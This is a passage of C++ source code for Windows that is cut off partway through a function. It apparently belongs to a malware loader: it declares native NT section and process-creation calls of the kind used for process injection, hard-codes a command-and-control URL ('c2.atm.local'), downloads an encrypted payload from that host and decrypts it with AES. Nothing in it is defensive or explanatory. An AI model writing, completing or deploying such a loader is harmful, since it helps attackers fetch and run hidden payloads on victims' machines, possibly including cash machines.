#include <Windows.h>
#include <wininet.h>
#include <wincrypt.h>
#include <iostream>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "crypt32.lib")

// Native NT structs
typedef NTSTATUS(WINAPI* _NtCreateSection)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
typedef NTSTATUS(WINAPI* _NtCreateProcessEx)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, ULONG, HANDLE, HANDLE, HANDLE, BOOLEAN);
typedef NTSTATUS(WINAPI* _NtMapViewOfSection)(
    HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
typedef NTSTATUS(WINAPI* _NtUnmapViewOfSection)(HANDLE, PVOID);

BYTE aesKey[32] = { 0xDE, 0xAD, 0xBE, 0xEF, /* your key here */ };
BYTE aesIV[16] = { 0xCA, 0xFE, 0xBA, 0xBE, /* your IV here */ };

const wchar_t* c2Url = L"https://c2.atm.local/payload.enc";

// Download encrypted payload
DWORD DownloadPayload(BYTE** data) {
    HINTERNET hInternet = InternetOpenW(L"ATM-Agent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return 0;
    HINTERNET hConnect = InternetOpenUrlW(hInternet, c2Url, NULL, 0, INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_UI, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return 0;
    }

    BYTE buffer[4096];
    DWORD bytesRead, totalSize = 0;
    BYTE* payload = NULL;

    do {
        if (!InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) || bytesRead == 0)
            break;
        BYTE* tmp = (BYTE*)realloc(payload, totalSize + bytesRead);
        if (!tmp) break;
        payload = tmp;
        memcpy(payload + totalSize, buffer, bytesRead);
        totalSize += bytesRead;
    } while (bytesRead > 0);

    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    *data = payload;
    return totalSize;
}

// AES Decrypt (same as previous)
BYTE* AESDecrypt(BYTE* encryptedData, DWORD dataLen, DWORD* outLen) {
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hKey = 0;
    BYTE* decryptedData = (BYTE*)malloc(dataLen);
    if (!decryptedData) return NULL;
    memcpy(decryptedData, encryptedData, dataLen);

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
        return NULL;

    struct {
        BLOBHEADER hdr;
        DWORD keyLength;
        BYTE key[32];
    } keyBlob = { { PLAINTEXTKEYBLOB, CUR_BLOB_VERSION, 0, CALG_AES_256 }, 32, {0} };

    memcpy(keyBlob.key, aesKey, 32);

    if (!CryptImportKey(hProv, (BYTE*)&keyBlob, sizeof(keyBlob), 0, 0, &hKey)) {
        CryptReleaseContext(hProv, 0);
        free(decryptedData);
        return NULL;
    }

    DWORD len = dataLen;
    if (!CryptSetKeyParam(hKey, KP_IV, aesIV, 0) ||
        !CryptDecrypt(hKey, 0, TRUE, 0, decryptedData, &len)) {
        CryptDestroyKey(hKey);
        CryptReleaseContext(hProv, 0);
        free(decryptedData);
        return NULL;
    }

    CryptDestroyKey(hKey);
    CryptReleaseContext(h
